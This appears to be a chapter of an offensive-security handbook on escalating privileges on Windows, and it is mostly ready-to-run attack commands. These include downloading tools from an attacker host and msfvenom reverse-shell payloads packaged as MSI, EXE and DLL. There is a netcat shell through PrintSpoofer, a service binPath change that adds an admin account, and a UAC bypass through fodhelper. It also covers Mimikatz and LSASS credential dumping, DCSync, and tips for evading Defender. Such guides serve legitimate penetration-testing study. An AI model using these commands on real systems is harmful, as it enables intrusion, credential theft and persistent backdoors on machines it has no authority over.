# 07 — Windows Privilege Escalation

Going from a low-priv user (or service account) to SYSTEM / Administrator on Windows. The surface is different from Linux — services, registry, tokens, ACLs.

---

## 1. First Five Commands After Foothold

```cmd
whoami /all
systeminfo
net user; net localgroup administrators
wmic qfe list brief
hostname
```

In PowerShell:
```powershell
whoami /all
$PSVersionTable
Get-ChildItem Env:
Get-CimInstance Win32_OperatingSystem | Select Caption, BuildNumber, OSArchitecture
Get-HotFix | Sort-Object InstalledOn -Descending | Select -First 20
```

These tell you:
- Who you are, what privileges/SID, what groups
- OS version, build, patch level
- Hotfixes (drives kernel exploit search)

---

## 2. Automated Enumeration

### 2.1 WinPEAS
```powershell
# stage:
iwr http://<atk>/winPEASx64.exe -o C:\Windows\Tasks\wp.exe
C:\Windows\Tasks\wp.exe > C:\Windows\Tasks\wp.out
type C:\Windows\Tasks\wp.out
```
Read the colored highlights. Like LinPEAS, it categorizes by likely-to-pop.

### 2.2 PowerUp.ps1
Focused on common privesc vectors (services, registry, AlwaysInstallElevated).
```powershell
iwr http://<atk>/PowerUp.ps1 -o C:\Windows\Tasks\pu.ps1
. C:\Windows\Tasks\pu.ps1
Invoke-AllChecks
```

### 2.3 SharpUp / Seatbelt / Watson
- **SharpUp.exe** — C# version of PowerUp, harder for AV to flag.
- **Seatbelt.exe** — broad host enumeration (creds, sessions, browsers).
- **Watson.exe** — kernel exploit suggester by KB number.

### 2.4 Sherlock.ps1 (legacy)
Older Watson predecessor for local privesc CVEs. Useful on Win7/2008.

---

## 3. Manual Enumeration Checklist

```cmd
:: Identity
whoami /all
whoami /priv
net user %username%
net localgroup
net localgroup administrators

:: Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

:: Software
wmic product get name,version,installdate
dir "C:\Program Files\"
dir "C:\Program Files (x86)\"

:: Services
sc query state= all
wmic service get name,displayname,pathname,startmode,startname

:: Scheduled tasks
schtasks /query /fo LIST /v

:: Processes
tasklist /v
wmic process list full

:: Network
ipconfig /all
route print
arp -a
netstat -ano

:: Drivers (signed?)
driverquery /v

:: Files of interest
dir C:\Users\
type C:\Windows\debug\NetSetup.log
type C:\Windows\System32\config\RegBack\SAM
type C:\sysprep.inf 2>nul
type C:\sysprep\sysprep.xml 2>nul
type C:\unattend.xml 2>nul
type C:\Windows\Panther\Unattend.xml 2>nul

:: Stored credentials
cmdkey /list
dir /s /a *unattend* *sysprep* *credentials* 2>nul
findstr /si pass *.txt *.xml *.ini *.config 2>nul
findstr /si pwd *.txt *.xml *.ini *.config 2>nul
```

PowerShell equivalents:
```powershell
Get-LocalUser
Get-LocalGroup; Get-LocalGroupMember Administrators
Get-Service | Where Status -eq Running
Get-ScheduledTask | Where State -ne Disabled | ft TaskName,State
Get-NetTCPConnection -State Listen
Get-Process -IncludeUserName 2>$null
Get-ChildItem -Recurse -Force C:\Users\*\Desktop\*.txt -ErrorAction SilentlyContinue
Select-String -Path C:\inetpub\wwwroot\*.config -Pattern 'password|pwd|secret' -ErrorAction SilentlyContinue
```

---

## 4. AlwaysInstallElevated (instant SYSTEM)

If both registry keys are `1`, any user can install MSI as SYSTEM.
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Both `0x1`? → instant root:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<atk> LPORT=4444 -f msi -o pwn.msi
# transfer to target, then:
msiexec /quiet /qn /i C:\Windows\Tasks\pwn.msi
```

---

## 5. Service Misconfigurations

### 5.1 Service binPath writable
```cmd
sc qc <service>
:: BINARY_PATH_NAME : C:\Program Files\Acme\acme.exe
icacls "C:\Program Files\Acme\acme.exe"
```
If you have write access to the binary or its folder:
- Replace binary with `msfvenom`-generated EXE that adds an admin user / spawns reverse shell.
- Restart service: `sc stop <svc> && sc start <svc>`.

### 5.2 Service config writable (modify binPath)
```cmd
sc config <svc> binPath= "cmd.exe /c net user pwn Pwn1234! /add && net localgroup administrators pwn /add"
sc start <svc>
```
Use `accesschk.exe -uwcqv <user> *` to find services your user can modify.

### 5.3 Unquoted Service Path
A service with `binPath = C:\Program Files\Acme\Sub Folder\app.exe` (no quotes) will try, in order:
- `C:\Program.exe`
- `C:\Program Files\Acme\Sub.exe`
- `C:\Program Files\Acme\Sub Folder\app.exe`

If you can write to any of these intermediate paths (most likely `C:\` is locked, but `C:\Program Files\Acme\` may not be):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<atk> LPORT=4444 -f exe -o "Sub.exe"
# upload as "C:\Program Files\Acme\Sub.exe"; restart service
```

### 5.4 DLL Hijacking
Service or process loads a DLL by name (no path). If a writable directory is searched first (e.g., its install dir), drop a malicious DLL.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<atk> LPORT=4444 -f dll -o evil.dll
```
Procmon + filters reveals which DLLs aren't found and where it looked.

---

## 6. Token Privileges

`whoami /priv` lists what your token can do. Disabled privileges *can be enabled* by code.

| Privilege | Exploit |
|-----------|---------|
| `SeImpersonatePrivilege` | Potato family → SYSTEM |
| `SeAssignPrimaryTokenPrivilege` | Potato variants |
| `SeBackupPrivilege` | Read SAM/SYSTEM hives → dump hashes |
| `SeRestorePrivilege` | Write protected files |
| `SeDebugPrivilege` | Inject into other processes |
| `SeTakeOwnershipPrivilege` | Take ownership of any object |
| `SeLoadDriverPrivilege` | Load kernel driver → kernel exec |
| `SeManageVolumePrivilege` | Sometimes leveraged with arbitrary file write |

### 6.1 Potato family (SeImpersonate / SeAssignPrimaryToken)
Service accounts (`IIS APPPOOL\<x>`, `NT AUTHORITY\NETWORK SERVICE`) typically have these. Pick one:

- **PrintSpoofer** — Server 2019/2022 with Print Spooler:
```cmd
PrintSpoofer.exe -i -c "cmd.exe /c \\<atk>\share\nc.exe <atk> 4444 -e cmd.exe"
```

- **GodPotato** — works on Server 2012R2 → 2022 (post-PrintSpoofer patches):
```cmd
GodPotato.exe -cmd "cmd.exe /c whoami"
GodPotato.exe -cmd "cmd.exe /c <reverse-shell>"
```

- **JuicyPotatoNG** — fallback for older systems.

- **RoguePotato** — works against Server 2016+ when SeImpersonate is available without DCOM-friendly local server.

### 6.2 SeBackup → SAM dump
```powershell
reg save HKLM\SAM C:\Windows\Tasks\sam.save
reg save HKLM\SYSTEM C:\Windows\Tasks\system.save
:: download both via SMB / HTTP
```
Then on attacker:
```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

### 6.3 SeDebug → token impersonation
With Mimikatz:
```
privilege::debug
token::elevate
```

---

## 7. Stored Credentials

### 7.1 Credential Manager
```cmd
cmdkey /list
:: looks promising? try:
runas /user:DOMAIN\admin /savecred cmd
:: but /savecred is for using stored creds, not extracting them
```
Mimikatz dumps stored creds:
```
sekurlsa::credman
vault::cred
vault::list
```

### 7.2 Saved RDP / browser creds
Browsers + Windows Vault:
```cmd
dir /s /b "%LOCALAPPDATA%\Microsoft\Credentials" 2>nul
dir /s /b "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" 2>nul
```
**Lazagne** automates extraction from many apps:
```
lazagne.exe all
```

### 7.3 Unattended install files
```cmd
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\system32\sysprep\unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml
type C:\sysprep.inf
type C:\unattend.xml
```
Look for `<AdministratorPassword>` / `<Password>` (sometimes base64-encoded with the literal "Password" appended).

### 7.4 Group Policy Preferences (GPP) — `cpassword`
Files in SYSVOL:
```
\\domain\SYSVOL\domain\Policies\<GUID>\MACHINE\Preferences\Groups\Groups.xml
```
Contain `cpassword=` blob. Decryptable with a published static AES key (`gpp-decrypt`, or built into `crackmapexec`).

### 7.5 PowerShell history
```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
Operators *love* to type passwords here.

### 7.6 Registry secrets
```cmd
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul
:: AutoLogon (common in lab)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

---

## 8. UAC Bypass (admin-but-not-elevated)

If your user is in Administrators but you have a non-elevated shell, UAC is in the way. Common bypasses:

- **fodhelper**:
```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start cmd"
Start-Process "C:\Windows\System32\fodhelper.exe"
```
- **eventvwr.exe + mscfile**: similar pattern, registry path different.
- **sdclt.exe**, **WSReset.exe**, etc. — many auto-elevated binaries can be hijacked via per-user registry.

UACMe (https://github.com/hfiref0x/UACME) catalogues 70+ bypass techniques.

---

## 9. Kernel / Local Privilege CVEs

When all else fails, map your `systeminfo` HotFix list to known kernel CVEs.

```bash
# Watson / win-exploits suggestor on attacker
windows-exploit-suggester.py --database <db.xls> --systeminfo systeminfo.txt
```
Or Watson (C#, runs on target).

Notable:
- **CVE-2021-36934 (HiveNightmare/SeriousSAM)** — non-admin readable SAM/SYSTEM/SECURITY backups
```powershell
icacls C:\Windows\System32\config\SAM      # if BUILTIN\Users :(R) → vulnerable
```
Then copy from VSS shadow copies and dump hashes.
- **CVE-2022-37969** — CLFS driver
- **CVE-2023-21768** — Win11/2022 LPE
- **PrintNightmare CVE-2021-1675 / CVE-2021-34527** — multiple variants
- **PrintDemon CVE-2020-1048**

Always read PoC source before running. Watch for backdoored binaries.

---

## 10. Active Directory Privilege Escalation (single-host)

When the box is domain-joined, even single-host privesc opens up domain pivots. See `08-active-directory.md` for full coverage. Short list of single-host AD wins:

- Local admin SID 500 → "Pass-the-Hash" against any domain box
- Cached domain credentials (`secretsdump.py LOCAL`) → reusable on the domain
- `LSA secrets` and `LAPS` blobs in the registry/file system
- `whoami /groups` showing privileged AD groups → that user is the privesc

---

## 11. Specific Privileged Groups

```powershell
Get-LocalGroupMember Administrators
Get-LocalGroupMember "Backup Operators"
Get-LocalGroupMember "Server Operators"
Get-LocalGroupMember "Print Operators"
Get-LocalGroupMember "Hyper-V Administrators"
```
- **Backup Operators** → `SeBackup`/`SeRestore` → SAM dump → admin hash → admin
- **Server Operators** (DC) → can modify services / start/stop → service binPath modify on DC
- **Hyper-V Administrators** → manage VMs as if admin, often includes DCSync paths
- **DnsAdmins** → load arbitrary DLL into the DNS service (running as SYSTEM on a DC)

---

## 12. Mimikatz Quick Reference

Run from a high-integrity (admin) cmd, with anti-virus off in lab.
```
mimikatz.exe
> privilege::debug
> sekurlsa::logonpasswords           # creds from LSASS
> sekurlsa::tickets /export
> lsadump::sam                       # local hashes (need SYSTEM)
> lsadump::secrets                   # LSA secrets (need SYSTEM)
> lsadump::cache                     # cached domain creds
> token::elevate
> kerberos::list /export
```
For DCSync (domain admin context):
```
> lsadump::dcsync /domain:acme.local /user:Administrator
> lsadump::dcsync /domain:acme.local /user:krbtgt
```

---

## 13. Hash Dumping Without Mimikatz

```bash
# from SAM/SYSTEM hives offline:
impacket-secretsdump -sam sam -system system LOCAL
impacket-secretsdump -ntds ntds.dit -system system LOCAL
# from DCSync (with domain creds):
impacket-secretsdump 'DOMAIN/user:pass@dc.acme.local'
# from a writable share holding LSASS dump:
pypykatz lsa minidump lsass.dmp
```

LSASS dump methods (no Mimikatz):
- `procdump.exe -accepteula -ma lsass.exe lsass.dmp` (signed, often whitelisted)
- Task Manager → right-click lsass → "Create dump file" (when GUI)
- `MiniDumpWriteDump` via custom code / PowerShell
- `comsvcs.dll` MiniDump trick:
```
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Tasks\l.dmp full
```

---

## 14. Windows File Access Control

`icacls` reads the ACL. Look for `Everyone`, `Authenticated Users`, `BUILTIN\Users` with write/modify.
```cmd
icacls "C:\Program Files\Acme\app.exe"
icacls "C:\Acme\service.exe"
:: recursive sweep:
accesschk.exe -uwsdq -accepteula "C:\" -t 2>nul
accesschk.exe -uwsdq -accepteula "%username%" "C:\" 2>nul
```

---

## 15. Lateral Movement to Local Admin (post-cred)

Once you've got an admin hash or password:

| Tool | Use |
|------|-----|
| `evil-winrm` | Cleanest interactive shell; needs WinRM (5985/5986) |
| `psexec.py` | Service-based, drops file, cleaner reverse shell |
| `wmiexec.py` | No file drop, uses WMI; quieter |
| `smbexec.py` | Service-based, keeps stdin/stdout via SMB pipes |
| `crackmapexec smb -x 'cmd'` | Quick command run across many hosts |
| `xfreerdp /u:admin /pth:<NTLM> /v:<host>` | Pass-the-Hash for RDP |

---

## 16. Decision Tree

1. `whoami /priv` — privileges that grant SYSTEM? → §6
2. `whoami /groups` — privileged groups? → §11 / §10
3. AlwaysInstallElevated set? → §4
4. Service misconfigs (`accesschk.exe`, PowerUp)? → §5
5. Stored creds (cmdkey, unattend, GPP, browsers)? → §7
6. UAC bypass needed? → §8
7. Kernel CVEs (Watson) as last resort → §9

If domain-joined, always also check §10 / `08-active-directory.md`.

---

## 17. Common Anti-Patterns

- Trying kernel exploits before checking `whoami /priv`.
- Ignoring service account context — `IIS APPPOOL\foo` almost always has SeImpersonate.
- Forgetting to unzip / extract LinPEAS-equivalent output and read it carefully.
- Re-using PowerShell payloads on heavily defender-protected boxes; use C# (SharpUp, GodPotato.exe) compiled binaries instead.
- Dropping mimikatz.exe directly to disk — instant Defender flag. Use `bypass-amsi`, in-memory loads, or `pypykatz` from a Linux box against a captured dump.

---

*On Windows the common path is: enum → service / token misconfig → SYSTEM. Kernel exploits are last resort.*
